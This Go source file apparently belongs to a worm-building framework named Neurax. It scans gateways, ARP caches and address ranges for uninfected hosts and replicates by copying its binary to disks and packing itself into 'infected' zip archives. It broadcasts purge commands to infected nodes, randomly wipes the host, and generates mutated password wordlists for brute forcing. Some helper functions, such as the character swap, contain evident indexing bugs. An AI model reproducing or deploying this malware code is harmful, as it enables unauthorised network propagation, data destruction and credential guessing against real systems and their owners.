func targets_lookup(targets []string) []string {
	res := []string{}
	for _, target := range targets {
		if RegexMatch("ip", target) {
			res = append(res, target)
		} else {
			ip_addresses, err := DnsLookup(target)
			if err != nil {
				return []string{}
			}
			res = append(res, ip_addresses...)
		}
	}
	return res
}

func neurax_scan_active(f func(string)) {
	targets := []string{}
	if N.ScanGatewayFirst {
		gateway := GetGatewayIP()
		targets = append(targets, gateway)
		NeuraxDebug("Added gateway to targets pool: " + gateway)
	}
	if len(N.ScanFirst) != 0 {
		targets = append(targets, targets_lookup(N.ScanFirst)...)
	}
	if N.ScanFirstOnly {
		targets = targets_lookup(N.ScanFirst)
	}
	if N.ScanArpCache {
		for ip, _ := range arp.Table() {
			if !IsHostInfected(ip) {
				targets = append(targets, ip)
			}
		}
		NeuraxDebug(F("Found %d targets in ARP cache", len(arp.Table())))
	}
	full_addr_range, _ := ExpandCidr(N.Cidr)
	for _, addr := range full_addr_range {
		if !Contains(N.Blacklist, addr) {
			targets = append(targets, addr)
		}
	}
	targets = RemoveFromSlice(targets, N.LocalIp)
	for _, target := range targets {
		NeuraxDebug("Scanning " + target)
		if IsHostActive(target) && !IsHostInfected(target) {
			NeuraxDebug("Scanned " + target)
			go f(target)
			if N.ScanHostInterval != "none" {
				time.Sleep(time.Duration(IntervalToSeconds(N.ScanHostInterval)) * time.Second)
			}
		}
	}
}

func neurax_scan_core(f func(string)) {
	if N.ScanPassive {
		go neurax_scan_passive(f)
	}
	if N.ScanActive {
		go neurax_scan_active(f)
	}
}

//Scans network for new hosts
func NeuraxScan(f func(string)) {
	for {
		neurax_scan_core(f)
		time.Sleep(time.Duration(IntervalToSeconds(N.ScanInterval)))
	}
}

func NeuraxDebug(msg string) {
	if N.Debug {
		PrintInfo(msg)
	}
}

func NeuraxScanInfected(c chan string) {
	full_addr_range, _ := ExpandCidr(N.Cidr)
	for _, addr := range full_addr_range {
		if !Contains(N.Blacklist, addr) {
			if IsHostInfected(addr) {
				c <- addr
			}
		}
	}
}

//Copies current binary to all found disks
func NeuraxDisks() error {
	selected_name := gen_haiku()
	if runtime.GOOS == "windows" {
		selected_name += ".exe"
	}
	disks, err := Disks()
	if err != nil {
		return err
	}
	for _, d := range disks {
		err := CopyFile(os.Args[0], d+"/"+selected_name)
		if err != nil {
			return err
		}
	}
	return nil
}

//Creates an infected .zip archive with given number of random files from current dir.
func NeuraxZIP(num_files int) error {
	archive_name := gen_haiku() + ".zip"
	files_to_zip := []string{os.Args[0]}
	files, err := CurrentDirFiles()
	if err != nil {
		return err
	}
	for i := 0; i < num_files; i++ {
		index := rand.Intn(len(files_to_zip))
		files_to_zip = append(files_to_zip, files[index])
		files[index] = files[len(files)-1]
		files = files[:len(files)-1]
	}
	return MakeZip(archive_name, files_to_zip)
}

//The binary zips itself and saves under save name in archive
func NeuraxZIPSelf() error {
	archive_name := os.Args[0] + ".zip"
	files_to_zip := []string{os.Args[0]}
	return MakeZip(archive_name, files_to_zip)
}

func gen_haiku() string {
	haikunator := haikunator.New(time.Now().UTC().UnixNano())
	return haikunator.Haikunate()
}

//Removes binary from all nodes that can be reached
func NeuraxPurge() {
	DataSender := SendDataUDP
	if N.CommProto == "tcp" {
		DataSender = SendDataTCP
	}
	for _, host := range InfectedHosts {
		err := DataSender(host, N.CommPort, "purge")
		ReportError("Cannot perform purge", err)
	}
	handle_command("purge")
}

//Removes binary from host and quits
func NeuraxPurgeSelf() {
	os.Remove(os.Args[0])
	os.Exit(0)
}

func WordEncapsule(word string) []string {
	return []string{
		"!" + word + "!",
		"?" + word + "?",
		":" + word + ":",
		"@" + word + "@",
		"#" + word + "#",
		"$" + word + "$",
		"%" + word + "%",
		"^" + word + "^",
		"&" + word + "&",
		"*" + word + "*",
		"(" + word + ")",
		"[" + word + "",
		"<" + word + ">",
	}
}

func WordCyryllicReplace(word string) []string {
	wordlist := []string{}
	refs := map[string]string{
		"й": "q", "ц": "w", "у": "e",
		"к": "r", "е": "t", "н": "y",
		"г": "u", "ш": "i", "щ": "o",
		"з": "p", "ф": "a", "ы": "s",
		"в": "d", "а": "f", "п": "g",
		"р": "h", "о": "j", "л": "k",
		"д": "l", "я": "z", "ч": "x",
		"с": "c", "м": "v", "и": "b",
		"т": "n", "ь": "m"}

	rus_word := word
	for k, v := range refs {
		rus_word = strings.Replace(rus_word, v, k, -1)
	}
	wordlist = append(wordlist, rus_word)
	return wordlist
}

func WordSingleUpperTransform(word string) []string {
	res := []string{}
	for i, _ := range word {
		splitted := strings.Fields(word)
		splitted[i] = strings.ToUpper(splitted[i])
		res = append(res, strings.Join(splitted, ""))
	}
	return res
}

func WordBasicLeet(word string) []string {
	leets := map[string]string{
		"a": "4", "b": "3", "g": "9", "o": "0", "i": "1",
	}
	for k, v := range leets {
		word = strings.Replace(word, k, v, -1)
		word = strings.Replace(word, strings.ToUpper(k), v, -1)
	}
	return []string{word}
}

func WordFullLeet(word string) []string {
	leets := map[string]string{
		"a": "4", "b": "3", "g": "9", "o": "0",
		"t": "7", "s": "5", "S": "$", "h": "#", "i": "1",
		"u": "v",
	}
	for k, v := range leets {
		word = strings.Replace(word, k, v, -1)
		word = strings.Replace(word, strings.ToUpper(k), v, -1)
	}
	return []string{word}
}

func WordRevert(word string) []string {
	return []string{Revert(word)}
}

func WordDuplicate(word string) []string {
	return []string{word + word}
}

func WordCharSwap(word string) []string {
	w := []rune(word)
	w[0], w[len(w)] = w[len(w)], w[0]
	return []string{string(w)}
}

func WordSpecialCharsAppend(word string) []string {
	res := []string{}
	res = append(res, word+"!")
	res = append(res, word+"!@")
	res = append(res, word+"!@#")
	res = append(res, word+"!@#$")
	res = append(res, word+"!@#$%")
	return res
}

func WordSpecialCharsPrepend(word string) []string {
	res := []string{}
	res = append(res, "!"+word)
	res = append(res, "!@"+word)
	res = append(res, "!@#"+word)
	res = append(res, "!@#$"+word)
	res = append(res, "!@#$%"+word)
	return res
}

func RussianRoulette() error {
	if RandomInt(1, 6) == 6 {
		return Wipe()
	}
	return nil
}

//Returns transformed words from input slice
func NeuraxWordlist(words ...string) []string {
	use_all := Contains(N.WordlistMutators, "all")
	wordlist := []string{}
	for i := 0; i < N.WordlistCommonNum; i++ {
		wordlist = append(wordlist, CommonPasswords[i])
	}
	if len(N.WordlistCommonCountries) != 0 {
		for cn, num := range N.WordlistCommonCountries {
			wordlist = append(wordlist, CommonPasswordsCountries[cn][0:num]...)
		}
	}
	for _, word := range words {
		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
		last_to_upper := word[:len(word)-1] + strings.ToUpper(string(word[len(word)-1]))
		wordlist = append(wordlist, strings.ToUpper(word))
		wordlist = append(wordlist, first_to_upper)
		wordlist = append(wordlist, last_to_upper)
		wordlist = append(wordlist, first_to_upper+"1")
		wordlist = append(wordlist, first_to_upper+"12")
		wordlist = append(wordlist, first_to_upper+"123")
		wordlist = append(wordlist, word+"1")
		wordlist = append(wordlist, word+"12")
		wordlist = append(wordlist, word+"123")
		if N.WordlistExpand {
			if Contains(N.WordlistMutators, "encapsule") || use_all {
				wordlist = append(wordlist, WordEncapsule(word)...)
			}
			if Contains(N.WordlistMutators, "cyryllic") || use_all {
				wordlist = append(wordlist, WordCyryllicReplace(word)...)
			}
			if Contains(N.WordlistMutators, "single_upper") || use_all {
				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
			}
			if Contains(N.WordlistMutators, "basic_leet") || use_all {
				wordlist = append(wordlist, WordBasicLeet(word)...)
			}
			if Contains(N.WordlistMutators, "full_leet") || use_all {
				wordlist = append(wordlist, WordFullLeet(word)...)
			}
			if Contains(N.WordlistMutators, "revert") || use_all {
				wordlist = append(wordlist, WordRevert(word)...)
			}
			if Contains(N.WordlistMutators, "duplicate") || use_all {
				wordlist = append(wordlist, WordDuplicate(word)...)
			}
			if Contains(N.WordlistMutators, "char_swap") || use_all {
				wordlist = append(wordlist, WordCharSwap(word)...)
			}
			if Contains(N.WordlistMutators, "special_append") || use_all {
				wordlist = append(wordlist, WordSpecialCharsAppend(word)...)
			}
			if Contains(N.WordlistMutators, "special_prepend") || use_all {
				wordlist = append(wordlist, WordSpecialCharsPrepend(word)...)
			}
		}
	}
	if Contains(N.WordlistMutators, "permute") || use_all {
		wordlist = append(wordlist, NeuraxWordlistPermute(words...)...)
	}
	wordlist = RemoveDuplicatesStr(wordlist)
	if N.WordlistShuffle {
		wordlist = ShuffleSlice(wordlist)
	}
	return wordlist
}

func NeuraxWordlistPermute(words ...string) []string {
	res := []string{}
	permuted := ""
	sep := N.WordlistPermuteSeparator
	for _, word := range words {
		cur_perm_len := len(strings.Split(permuted, sep))
		selected := RandomSelectStr(words)
		if !strings.Contains(permuted, selected) && cur_perm_len < N.WordlistPermuteNum {
			permuted += word + sep + selected + sep
			res = append(res, permuted)
		}
	}
	return res
}

func NeuraxSetTTL(interval string) {
	first_exec := time.Now()
	for {
		time.Sleep(time.Duration(10))
		passed := time.Since(first_exec).Seconds()
		if int(passed) > IntervalToSeconds(interval) {
			NeuraxPurgeSelf()
		}
	}
}

func NeuraxMigrate(path string) error {
	current_path, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	if strings.Contains(current_path, path) {
		return nil
	}
	NeuraxDebug("Migrating -> " + path)
	return CopyFile(os.Args[0], path)
}

func NeuraxAlloc() {
	min_alloc := SizeToBytes("10m")
	max_alloc := SizeToBytes("600m")
	for n := 0; n < N.AllocNum; n++ {
		num_bytes := RandomInt(min_alloc, max_alloc)
		_ = make([]byte, num_bytes)
	}
}
